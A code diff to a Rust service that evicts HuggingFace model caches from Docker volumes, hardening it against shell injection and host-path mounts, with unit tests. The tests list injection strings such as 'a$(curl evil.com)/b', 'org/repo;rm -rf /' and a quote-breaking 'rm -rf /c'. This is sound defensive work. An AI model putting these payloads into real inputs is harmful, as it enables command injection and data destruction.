@@ -1783,10 +1783,27 @@ async fn docker_evict(
 
     // Resolve the cache volume: explicit override, else autodetect across the
     // typo / project-prefix variants from what actually exists on the host.
-    let volume = match payload.cache_volume.clone() {
-        Some(v) if !v.trim().is_empty() => v.trim().to_string(),
+    let volume = match payload.cache_volume.as_deref().map(str::trim) {
+        Some(v) if !v.is_empty() => {
+            // A named volume only — never a host path (would bind-mount the host
+            // into the rm container). Then confirm it actually exists.
+            if let Err(msg) = validate_volume_name(v) {
+                return err(StatusCode::BAD_REQUEST, msg);
+            }
+            let volumes = match list_docker_volumes().await {
+                Ok(v) => v,
+                Err(e) => return err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()),
+            };
+            if !volumes.iter().any(|existing| existing == v) {
+                return err(
+                    StatusCode::NOT_FOUND,
+                    format!("cache_volume '{v}' is not an existing Docker named volume on this host"),
+                );
+            }
+            v.to_string()
+        }
         _ => {
-            let volumes = match list_docker_volumes() {
+            let volumes = match list_docker_volumes().await {
                 Ok(v) => v,
                 Err(e) => return err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()),
             };
@@ -1800,7 +1817,7 @@ async fn docker_evict(
     // Safety guard: refuse to evict weights for a model that is actively served.
     // (Only relevant when weights are in scope; a pure "cache" evict is harmless.)
     if matches!(payload.target, EvictTarget::Weights | EvictTarget::Both) {
-        match containers_serving_model(&model) {
+        match containers_serving_model(&model).await {
             Ok(running) if !running.is_empty() => {
                 return err(
                     StatusCode::CONFLICT,
@@ -1833,14 +1850,19 @@ async fn docker_evict(
 
     let mut removed_paths: Vec<String> = Vec::new();
     let mut freed_bytes: u64 = 0;
+    // Best-effort cache failures are collected, not fatal — see below.
+    let mut cache_errors: Vec<String> = Vec::new();
 
-    // Weights subtree: hub/models--org--repo.
+    // Weights subtree: hub/models--org--repo. A removal *failure* here is fatal
+    // (500); a simply-absent dir is not an error (reported as "nothing to evict").
     if matches!(payload.target, EvictTarget::Weights | EvictTarget::Both) {
         let rel = format!("hub/{hub_dir}");
-        match evict_subtree(&volume, &rel) {
-            Ok(bytes) => {
-                freed_bytes += bytes;
-                removed_paths.push(format!("{volume}:/{rel}"));
+        match evict_subtree(&volume, &rel).await {
+            Ok(outcome) => {
+                if outcome.existed {
+                    freed_bytes += outcome.freed_bytes;
+                    removed_paths.push(format!("{volume}:/{rel}"));
+                }
             }
             Err(e) => return err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()),
         }
@@ -1848,17 +1870,18 @@ async fn docker_evict(
 
     // Compile/kernel caches: best-effort only — these are hash-keyed and not
     // cleanly attributable to one model, so we only clear model-named subdirs
-    // if they happen to exist.
+    // if they happen to exist. A failure here must NOT 500 (and especially must
+    // not discard an already-completed weights removal): collect and report it.
     if matches!(payload.target, EvictTarget::Cache | EvictTarget::Both) {
         for rel in model_cache_rels(&hub_dir) {
-            match evict_subtree(&volume, &rel) {
-                Ok(bytes) => {
-                    if bytes > 0 {
-                        freed_bytes += bytes;
+            match evict_subtree(&volume, &rel).await {
+                Ok(outcome) => {
+                    if outcome.existed {
+                        freed_bytes += outcome.freed_bytes;
                         removed_paths.push(format!("{volume}:/{rel}"));
                     }
                 }
-                Err(e) => return err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()),
+                Err(e) => cache_errors.push(format!("{rel}: {e}")),
             }
         }
     }
@@ -1885,7 +1908,7 @@ async fn docker_evict(
     } else {
         ""
     };
-    let summary = if removed_paths.is_empty() {
+    let mut summary = if removed_paths.is_empty() {
         format!("nothing to evict for '{model}' in volume '{volume}' (not present){cache_note}")
     } else {
         format!(
@@ -1897,6 +1920,14 @@ async fn docker_evict(
             cache_note
         )
     };
+    // Best-effort cache failures never fail the request (weights may already be
+    // gone) — surface them in the success message so the caller can see them.
+    if !cache_errors.is_empty() {
+        summary.push_str(&format!(
+            "; best-effort cache cleanup had errors: {}",
+            cache_errors.join("; ")
+        ));
+    }
     ok_output(summary)
 }
 
@@ -2323,6 +2354,31 @@ fn run_command(program: &str, args: &[&str]) -> Result<String> {
     Ok(String::from_utf8_lossy(&output.stdout).to_string())
 }
 
+/// Async counterpart to `run_command` (uses tokio's `AsyncCommand` so it never
+/// blocks a worker thread). Same success/error contract.
+async fn run_command_async(program: &str, args: &[&str]) -> Result<String> {
+    let output = AsyncCommand::new(program)
+        .args(args)
+        .output()
+        .await
+        .with_context(|| format!("Failed to execute: {} {}", program, args.join(" ")))?;
+
+    if !output.status.success() {
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        let stdout = String::from_utf8_lossy(&output.stdout);
+        return Err(anyhow!(
+            "{} {} failed (exit {}):\nstderr: {}\nstdout: {}",
+            program,
+            args.join(" "),
+            output.status.code().map(|c| c.to_string()).unwrap_or("signal".into()),
+            stderr,
+            stdout
+        ));
+    }
+
+    Ok(String::from_utf8_lossy(&output.stdout).to_string())
+}
+
 /// Run `docker <args>` and return trimmed stdout, or None on failure/empty.
 async fn docker_inspect_output(args: &[&str]) -> Option<String> {
     let out = AsyncCommand::new("docker").args(args).output().await.ok()?;
@@ -2454,20 +2510,44 @@ fn model_to_hub_dir(model: &str) -> Result<String, String> {
     if model.is_empty() {
         return Err("model must not be empty".into());
     }
-    // HF repo ids are `org/repo` (occasionally a bare `repo`). Reject anything
-    // that could escape `hub/` — leading/embedded path components, dot-segments,
-    // backslashes, NUL. The `org/repo -> org--repo` rewrite means a legitimate id
-    // never contains `..` or a leading slash.
+    // Strict allowlist. HF repo ids are `org/repo` (occasionally a bare `repo`)
+    // and each path component is drawn from `[A-Za-z0-9._-]`. Enforcing this is
+    // the primary defense: the resulting dir name is interpolated into an
+    // `alpine sh -c` script, so the charset MUST exclude shell metacharacters
+    // (`$ ` ; & | ( ) " ' < > \ * ? newline …`) and path-traversal sequences.
     if model.contains("..")
-        || model.contains('\\')
-        || model.contains('\0')
         || model.starts_with('/')
         || model.ends_with('/')
         || model.contains("//")
     {
-        return Err(format!("invalid model id: '{model}'"));
+        return Err(format!("invalid model id (path traversal): '{model}'"));
+    }
+    let allowed = |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/');
+    if !model.chars().all(allowed) {
+        return Err(format!(
+            "invalid model id '{model}': only [A-Za-z0-9._/-] are allowed"
+        ));
     }
     Ok(format!("models--{}", model.replace('/', "--")))
+}
+
+/// Validate a Docker NAMED volume reference for `evict`. A name like `/`,
+/// `/etc`, or `../x` would, when used as a `-v <src>:/c` mount source, bind a
+/// HOST path into the throwaway container where `rm -rf` then runs — so reject
+/// anything that isn't a plain named volume `[A-Za-z0-9_.-]+`. Callers still
+/// cross-check against `docker volume ls` (autodetected names always do; an
+/// explicit override is validated here before use).
+fn validate_volume_name(volume: &str) -> Result<(), String> {
+    if volume.is_empty() {
+        return Err("cache_volume must not be empty".into());
+    }
+    let ok = volume.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '-'));
+    if !ok {
+        return Err(format!(
+            "invalid cache_volume '{volume}': must be a Docker named volume ([A-Za-z0-9_.-]), not a host path"
+        ));
+    }
+    Ok(())
 }
 
 /// Candidate names (in priority order) for the shared HuggingFace cache volume.
@@ -2477,8 +2557,8 @@ fn model_to_hub_dir(model: &str) -> Result<String, String> {
 const HF_VOLUME_BASENAMES: &[&str] = &["huggingface_cache", "hugginface_cache"];
 
 /// List all docker volume names on the host.
-fn list_docker_volumes() -> Result<Vec<String>> {
-    let out = run_command("docker", &["volume", "ls", "--format", "{{.Name}}"])?;
+async fn list_docker_volumes() -> Result<Vec<String>> {
+    let out = run_command_async("docker", &["volume", "ls", "--format", "{{.Name}}"]).await?;
     Ok(out.lines().map(str::trim).filter(|l| !l.is_empty()).map(String::from).collect())
 }
 
@@ -2512,40 +2592,52 @@ fn resolve_hf_cache_volume(volumes: &[String]) -> Result<String, String> {
 /// args AND environment for an exact token match — covering both the engine
 /// `--model-path <org/repo>` / `--model <org/repo>` flag and a `MODEL_NAME` /
 /// `*=org/repo` env var. Returns the matching container names.
-fn containers_serving_model(model: &str) -> Result<Vec<String>> {
-    let ids = run_command("docker", &["ps", "-q"])?;
+async fn containers_serving_model(model: &str) -> Result<Vec<String>> {
+    let ids = run_command_async("docker", &["ps", "-q"]).await?;
     let ids: Vec<&str> = ids.lines().map(str::trim).filter(|l| !l.is_empty()).collect();
     if ids.is_empty() {
         return Ok(vec![]);
     }
 
+    // One `docker inspect` over ALL running ids (avoids an N+1 subprocess
+    // storm). It emits a JSON array; .Args = argv after the entrypoint,
+    // .Config.Cmd covers the (rare) case where the model flag lives in Cmd,
+    // .Config.Env = env, .Name = container name (leading '/').
+    let mut args: Vec<&str> = vec!["inspect"];
+    args.extend(ids.iter().copied());
+    let raw = run_command_async("docker", &args).await?;
+
+    #[derive(Deserialize)]
+    struct ContainerConfig {
+        #[serde(default, rename = "Cmd")]
+        cmd: Vec<String>,
+        #[serde(default, rename = "Env")]
+        env: Vec<String>,
+    }
+    #[derive(Deserialize)]
+    struct Inspected {
+        #[serde(default, rename = "Name")]
+        name: String,
+        #[serde(default, rename = "Args")]
+        args: Vec<String>,
+        #[serde(default, rename = "Config")]
+        config: Option<ContainerConfig>,
+    }
+
+    let inspected: Vec<Inspected> = serde_json::from_str(&raw)
+        .with_context(|| "failed to parse `docker inspect` output")?;
+
     let mut matches = Vec::new();
-    for id in ids {
-        // {{json .Args}} = argv after the entrypoint; {{json .Config.Env}} = env;
-        // {{json .Config.Cmd}} covers the (rare) case where the model flag lives
-        // in Cmd rather than Args. .Name is the container name (leading '/').
-        let fmt = "{{.Name}}\t{{json .Args}}\t{{json .Config.Cmd}}\t{{json .Config.Env}}";
-        let raw = match run_command("docker", &["inspect", "--format", fmt, id]) {
-            Ok(s) => s,
-            // A container can vanish between `ps` and `inspect`; skip it.
-            Err(_) => continue,
-        };
-        let line = raw.trim();
-        let mut parts = line.splitn(4, '\t');
-        let name = parts.next().unwrap_or("").trim_start_matches('/').to_string();
-        let args_json = parts.next().unwrap_or("[]");
-        let cmd_json = parts.next().unwrap_or("[]");
-        let env_json = parts.next().unwrap_or("[]");
-
-        let args: Vec<String> = serde_json::from_str(args_json).unwrap_or_default();
-        let cmd: Vec<String> = serde_json::from_str(cmd_json).unwrap_or_default();
-        let env: Vec<String> = serde_json::from_str(env_json).unwrap_or_default();
-
-        if argv_serves_model(&args, model)
+    for c in inspected {
+        let (cmd, env) = c
+            .config
+            .map(|cfg| (cfg.cmd, cfg.env))
+            .unwrap_or_default();
+        if argv_serves_model(&c.args, model)
             || argv_serves_model(&cmd, model)
             || env_serves_model(&env, model)
         {
-            matches.push(name);
+            matches.push(c.name.trim_start_matches('/').to_string());
         }
     }
     Ok(matches)
@@ -2580,26 +2672,40 @@ fn env_serves_model(env: &[String], model: &str) -> bool {
     env.iter().any(|kv| matches!(kv.split_once('='), Some((_, v)) if v == model))
 }
 
+/// Outcome of a single subtree eviction.
+struct EvictOutcome {
+    /// Whether the path existed before removal.
+    existed: bool,
+    /// Pre-removal size in bytes (best-effort; 0 if it couldn't be measured).
+    freed_bytes: u64,
+}
+
 /// Remove a single subtree (relative to the cache volume root) via a throwaway
-/// alpine container — never touches anything outside `/c/<rel>`. Returns the
-/// pre-removal size in bytes (best-effort; 0 if it can't be measured or the
-/// path is absent).
-fn evict_subtree(volume: &str, rel: &str) -> Result<u64> {
+/// alpine container — never touches anything outside `/c/<rel>`.
+///
+/// The target path is passed as a SEPARATE argv element (`sh -c <script> sh
+/// "$1"`), never interpolated into the script body, so a `rel` value can't
+/// break out of the shell quoting. Returns whether the path existed and the
+/// best-effort freed size. Async to avoid blocking the tokio worker.
+async fn evict_subtree(volume: &str, rel: &str) -> Result<EvictOutcome> {
     let mount = format!("{volume}:/c");
-    // `du -sb` prints "<bytes>\t<path>"; missing path => empty output (no error).
     let target = format!("/c/{rel}");
-    let script = format!(
-        "set -eu; T=\"{target}\"; \
-         if [ ! -e \"$T\" ]; then echo 0; exit 0; fi; \
+    // Fixed script; the target arrives as positional $1. `du -sb` => "<bytes>\t<path>".
+    // First line "1"/"0" reports existence; second line reports bytes.
+    let script = "set -eu; T=\"$1\"; \
+         if [ ! -e \"$T\" ]; then echo 0; echo 0; exit 0; fi; \
          SZ=$(du -sb \"$T\" 2>/dev/null | cut -f1 || echo 0); \
          rm -rf \"$T\"; \
-         echo \"${{SZ:-0}}\""
-    );
-    let out = run_command(
+         echo 1; echo \"${SZ:-0}\"";
+    let out = run_command_async(
         "docker",
-        &["run", "--rm", "-v", &mount, "alpine:3.20", "sh", "-c", &script],
-    )?;
-    Ok(out.trim().lines().last().and_then(|l| l.trim().parse::<u64>().ok()).unwrap_or(0))
+        &["run", "--rm", "-v", &mount, "alpine:3.20", "sh", "-c", script, "sh", &target],
+    )
+    .await?;
+    let mut lines = out.lines().map(str::trim).filter(|l| !l.is_empty());
+    let existed = lines.next() == Some("1");
+    let freed_bytes = lines.next().and_then(|l| l.parse::<u64>().ok()).unwrap_or(0);
+    Ok(EvictOutcome { existed, freed_bytes })
 }
 
 /// Best-effort compile/kernel cache subdirs for a model. These caches
@@ -3554,6 +3660,37 @@ mod tests {
     fn model_to_hub_dir_rejects_traversal() {
         for bad in ["", "../etc", "org/../../etc", "/abs/path", "org/repo/", "a//b", "org\\repo", "x\0y"] {
             assert!(model_to_hub_dir(bad).is_err(), "expected reject for {bad:?}");
+        }
+    }
+
+    #[test]
+    fn model_to_hub_dir_rejects_shell_metacharacters() {
+        // The dir name is interpolated/passed to alpine; any metachar must be
+        // rejected by the strict [A-Za-z0-9._/-] allowlist.
+        for bad in [
+            "a$(curl evil.com)/b",
+            "org/repo;rm -rf /",
+            "org/`whoami`",
+            "org/repo\"; rm -rf /c; echo \"",
+            "org/repo|cat",
+            "org/repo&whoami",
+            "org/repo with space",
+            "org/repo\nnewline",
+            "org/repo*",
+        ] {
+            assert!(model_to_hub_dir(bad).is_err(), "expected reject for {bad:?}");
+        }
+    }
+
+    #[test]
+    fn validate_volume_name_rejects_host_paths() {
+        // Valid named volumes.
+        for ok in ["huggingface_cache", "small-models_hugginface_cache", "vol.1-x"] {
+            assert!(validate_volume_name(ok).is_ok(), "expected ok for {ok:?}");
+        }
+        // Host paths / traversal / metachars must be rejected (would bind-mount host).
+        for bad in ["", "/", "/etc", "../x", "a/b", "$(x)", "vol;rm"] {
+            assert!(validate_volume_name(bad).is_err(), "expected reject for {bad:?}");
         }
     }
 
